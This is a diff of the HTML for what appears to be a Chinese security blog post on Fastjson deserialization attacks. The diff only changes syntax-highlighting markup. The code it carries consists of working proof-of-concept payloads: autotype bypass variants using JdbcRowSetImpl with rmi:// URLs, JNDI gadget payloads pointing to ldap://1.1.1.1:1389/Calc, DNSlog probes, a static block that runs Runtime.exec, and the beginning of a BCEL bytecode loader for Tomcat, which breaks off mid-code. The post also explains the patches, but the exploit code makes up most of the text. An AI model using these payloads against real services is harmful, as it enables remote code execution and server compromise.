-        <span class="n">String</span> <span class="n">PoC</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;Lcom.sun.rowset.JdbcRowSetImpl;\&#34;, \&#34;dataSourceName\&#34;:\&#34;rmi://127.0.0.1:1099/obj\&#34;, \&#34;autoCommit\&#34;:true}&#34;</span><span class="o">;</span>
-        <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">PoC</span><span class="o">);</span>
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//需要开启autotype
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">PoC</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;Lcom.sun.rowset.JdbcRowSetImpl;\&#34;, \&#34;dataSourceName\&#34;:\&#34;rmi://127.0.0.1:1099/obj\&#34;, \&#34;autoCommit\&#34;:true}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">PoC</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>这里前面添加<code>L</code>后面添加<code>;</code>的原因是: <code>com.alibaba.fastjson.parser#TypeUtils.loadClass(typeName, this.defaultClassLoader);</code> 方法中，内容如果为<code>L</code>开头<code>;</code>结尾的话就会将这2个字符清空。</p>
 <p><img src="/images/1635343655.png" alt=""></p>
@@ -613,19 +613,19 @@
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
-        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
-        <span class="n">String</span> <span class="n">PoC</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;LLcom.sun.rowset.JdbcRowSetImpl;;\&#34;, \&#34;dataSourceName\&#34;:\&#34;rmi://127.0.0.1:1099/obj\&#34;, \&#34;autoCommit\&#34;:true}&#34;</span><span class="o">;</span>
-        <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">PoC</span><span class="o">);</span>
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">PoC</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;LLcom.sun.rowset.JdbcRowSetImpl;;\&#34;, \&#34;dataSourceName\&#34;:\&#34;rmi://127.0.0.1:1099/obj\&#34;, \&#34;autoCommit\&#34;:true}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">PoC</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>利用了双写的方式，在<code>com.alibaba.fastjson.parser#checkcheckAutoType</code>中将<code>L</code>和<code>;</code>进行清空，而在TypeUtils.loadclass中将第二组内容清空。</p>
 <p>修复方式:</p>
@@ -647,19 +647,19 @@
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
-        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
-        <span class="n">String</span> <span class="n">PoC</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;[com.sun.rowset.JdbcRowSetImpl\&#34;[{, \&#34;dataSourceName\&#34;:\&#34;rmi://127.0.0.1:1099/obj\&#34;, \&#34;autoCommit\&#34;:true}&#34;</span><span class="o">;</span>
-        <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">PoC</span><span class="o">);</span>
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">PoC</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;[com.sun.rowset.JdbcRowSetImpl\&#34;[{, \&#34;dataSourceName\&#34;:\&#34;rmi://127.0.0.1:1099/obj\&#34;, \&#34;autoCommit\&#34;:true}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">PoC</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>修复方式:</p>
 <p>在1.2.44中将<code>[</code>进行限制。</p>
@@ -674,12 +674,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;dependency&gt;</span>
-    <span class="nt">&lt;groupId&gt;</span>org.mybatis<span class="nt">&lt;/groupId&gt;</span>
-    <span class="nt">&lt;artifactId&gt;</span>mybatis<span class="nt">&lt;/artifactId&gt;</span>
-    <span class="nt">&lt;version&gt;</span>3.4.6<span class="nt">&lt;/version&gt;</span>
-<span class="nt">&lt;/dependency&gt;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>org.mybatis<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>mybatis<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>3.4.6<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
@@ -697,19 +697,19 @@
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
-        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
-        <span class="n">String</span> <span class="n">PoC</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&#34;,\&#34;properties\&#34;:{\&#34;data_source\&#34;:\&#34;rmi://127.0.0.1:1099/obj\&#34;}}&#34;</span><span class="o">;</span>
-        <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">PoC</span><span class="o">);</span>
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">PoC</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&#34;,\&#34;properties\&#34;:{\&#34;data_source\&#34;:\&#34;rmi://127.0.0.1:1099/obj\&#34;}}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">PoC</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>修复方式:</p>
 <p>1.2.46无法执行成功，应该是把该类拉入了黑名单中。</p>
@@ -741,17 +741,17 @@
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
-        <span class="n">String</span> <span class="n">PoC</span> <span class="o">=</span> <span class="s">&#34;{\&#34;a\&#34;:{\&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,\&#34;val\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;},\&#34;b\&#34;:{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;rmi://localhost:1099/obj\&#34;,\&#34;autoCommit\&#34;:true}}&#34;</span><span class="o">;</span>
-        <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">PoC</span><span class="o">);</span>
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">PoC</span> <span class="o">=</span> <span class="s">&#34;{\&#34;a\&#34;:{\&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,\&#34;val\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;},\&#34;b\&#34;:{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;rmi://localhost:1099/obj\&#34;,\&#34;autoCommit\&#34;:true}}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">PoC</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>修复方式:</p>
 <p>在1.2.48中MiscCodec处理Class类的地方设置了cache为false。</p>
@@ -766,11 +766,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="o">{</span><span class="s">&#34;@type&#34;</span><span class="o">:</span><span class="s">&#34;org.apache.shiro.jndi.JndiObjectFactory&#34;</span><span class="o">,</span><span class="s">&#34;resourceName&#34;</span><span class="o">:</span><span class="s">&#34;ldap://1.1.1.1:1389/Calc&#34;</span><span class="o">}</span>
-<span class="o">{</span><span class="s">&#34;@type&#34;</span><span class="o">:</span><span class="s">&#34;br.com.anteros.dbcp.AnterosDBCPConfig&#34;</span><span class="o">,</span><span class="s">&#34;metricRegistry&#34;</span><span class="o">:</span><span class="s">&#34;ldap://1.1.1.1:1389/Calc&#34;</span><span class="o">}</span>
-<span class="o">{</span><span class="s">&#34;@type&#34;</span><span class="o">:</span><span class="s">&#34;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&#34;</span><span class="o">,</span><span class="s">&#34;jndiNames&#34;</span><span class="o">:</span><span class="s">&#34;ldap://1.1.1.1:1389/Calc&#34;</span><span class="o">}</span>
-<span class="o">{</span><span class="s">&#34;@type&#34;</span><span class="o">:</span><span class="s">&#34;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&#34;</span><span class="o">,</span><span class="s">&#34;properties&#34;</span><span class="o">:</span> <span class="o">{</span><span class="s">&#34;@type&#34;</span><span class="o">:</span><span class="s">&#34;java.util.Properties&#34;</span><span class="o">,</span><span class="s">&#34;UserTransaction&#34;</span><span class="o">:</span><span class="s">&#34;ldap:/1.1.1.1:1389/Calc&#34;</span><span class="o">}}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">{</span><span class="s">&#34;@type&#34;</span><span class="o">:</span><span class="s">&#34;org.apache.shiro.jndi.JndiObjectFactory&#34;</span><span class="o">,</span><span class="s">&#34;resourceName&#34;</span><span class="o">:</span><span class="s">&#34;ldap://1.1.1.1:1389/Calc&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s">&#34;@type&#34;</span><span class="o">:</span><span class="s">&#34;br.com.anteros.dbcp.AnterosDBCPConfig&#34;</span><span class="o">,</span><span class="s">&#34;metricRegistry&#34;</span><span class="o">:</span><span class="s">&#34;ldap://1.1.1.1:1389/Calc&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s">&#34;@type&#34;</span><span class="o">:</span><span class="s">&#34;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&#34;</span><span class="o">,</span><span class="s">&#34;jndiNames&#34;</span><span class="o">:</span><span class="s">&#34;ldap://1.1.1.1:1389/Calc&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s">&#34;@type&#34;</span><span class="o">:</span><span class="s">&#34;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&#34;</span><span class="o">,</span><span class="s">&#34;properties&#34;</span><span class="o">:</span> <span class="o">{</span><span class="s">&#34;@type&#34;</span><span class="o">:</span><span class="s">&#34;java.util.Properties&#34;</span><span class="o">,</span><span class="s">&#34;UserTransaction&#34;</span><span class="o">:</span><span class="s">&#34;ldap:/1.1.1.1:1389/Calc&#34;</span><span class="o">}}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="fastjson--1268"><a href="#fastjson--1268" class="anchor-link">#</a><a href="#contents:fastjson--1268" class="headings">FastJson ≤ 1.2.68</a></h3>
 <p>AutoCloseable利用链，可以看看这个博客 <a href="http://b1ue.cn/page/1/" target="_blank" rel="noopener">http://b1ue.cn/page/1/</a></p>
@@ -786,11 +786,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="c1">//这几个本地未测成功
-</span><span class="c1"></span><span class="o">{</span><span class="s">&#34;rand1&#34;</span><span class="o">:{</span><span class="s">&#34;@type&#34;</span><span class="o">:</span><span class="s">&#34;java.net.InetAddress&#34;</span><span class="o">,</span><span class="s">&#34;val&#34;</span><span class="o">:</span><span class="s">&#34;&lt;http://dnslog&gt;&#34;</span><span class="o">}}</span>
-<span class="o">{</span><span class="s">&#34;rand2&#34;</span><span class="o">:{</span><span class="s">&#34;@type&#34;</span><span class="o">:</span><span class="s">&#34;java.net.Inet4Address&#34;</span><span class="o">,</span><span class="s">&#34;val&#34;</span><span class="o">:</span><span class="s">&#34;&lt;http://dnslog&gt;&#34;</span><span class="o">}}</span>
-<span class="o">{</span><span class="s">&#34;rand3&#34;</span><span class="o">:{</span><span class="s">&#34;@type&#34;</span><span class="o">:</span><span class="s">&#34;java.net.Inet6Address&#34;</span><span class="o">,</span><span class="s">&#34;val&#34;</span><span class="o">:</span><span class="s">&#34;&lt;http://dnslog&gt;&#34;</span><span class="o">}}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//这几个本地未测成功
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">{</span><span class="s">&#34;rand1&#34;</span><span class="o">:{</span><span class="s">&#34;@type&#34;</span><span class="o">:</span><span class="s">&#34;java.net.InetAddress&#34;</span><span class="o">,</span><span class="s">&#34;val&#34;</span><span class="o">:</span><span class="s">&#34;&lt;http://dnslog&gt;&#34;</span><span class="o">}}</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s">&#34;rand2&#34;</span><span class="o">:{</span><span class="s">&#34;@type&#34;</span><span class="o">:</span><span class="s">&#34;java.net.Inet4Address&#34;</span><span class="o">,</span><span class="s">&#34;val&#34;</span><span class="o">:</span><span class="s">&#34;&lt;http://dnslog&gt;&#34;</span><span class="o">}}</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s">&#34;rand3&#34;</span><span class="o">:{</span><span class="s">&#34;@type&#34;</span><span class="o">:</span><span class="s">&#34;java.net.Inet6Address&#34;</span><span class="o">,</span><span class="s">&#34;val&#34;</span><span class="o">:</span><span class="s">&#34;&lt;http://dnslog&gt;&#34;</span><span class="o">}}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="tomcat-加载bcel字节码"><a href="#tomcat-加载bcel字节码" class="anchor-link">#</a><a href="#contents:tomcat-加载bcel字节码" class="headings">Tomcat 加载bcel字节码</a></h2>
 <p>再用JdbcRowSetImpl这条链去打的时候，遇到不出网的情况就没办法利用。前面说到过TemplatesImpl可以加载字节码，但在调用parseObject()方法时，需要加入Feature.SupportNonPublicField参数才行。</p>
@@ -804,12 +804,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;dependency&gt;</span>
-    <span class="nt">&lt;groupId&gt;</span>org.apache.tomcat<span class="nt">&lt;/groupId&gt;</span>
-    <span class="nt">&lt;artifactId&gt;</span>tomcat-dbcp<span class="nt">&lt;/artifactId&gt;</span>
-    <span class="nt">&lt;version&gt;</span>9.0.8<span class="nt">&lt;/version&gt;</span>
-<span class="nt">&lt;/dependency&gt;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>org.apache.tomcat<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>tomcat-dbcp<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>9.0.8<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>test.java</p>
 <div class="highlight"><div class="chroma">
@@ -829,20 +829,20 @@
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="o">{</span>
-    <span class="kd">static</span> <span class="o">{</span>
-        <span class="k">try</span> <span class="o">{</span>
-            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;calc&#34;</span><span class="o">);</span>
-        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-        <span class="o">}</span>
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">com</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">static</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;calc&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="fastjson--1224"><a href="#fastjson--1224" class="anchor-link">#</a><a href="#contents:fastjson--1224" class="headings">FastJson ≤ 1.2.24</a></h3>
 <div class="highlight"><div class="chroma">
@@ -875,33 +875,33 @@
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.sun.org.apache.bcel.internal.Repository</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.sun.org.apache.bcel.internal.classfile.JavaClass</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.sun.org.apache.bcel.internal.classfile.Utility</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
-        <span class="k">try</span><span class="o">{</span>
-            <span class="n">JavaClass</span> <span class="n">cls</span> <span class="o">=</span> <span class="n">Repository</span><span class="o">.</span><span class="na">lookupClass</span><span class="o">(</span><span class="n">test</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
-            <span class="n">String</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Utility</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="n">cls</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(),</span> <span class="kc">true</span><span class="o">);</span><span class="c1">//转换为字节码并编码为bcel字节码
-</span><span class="c1"></span>
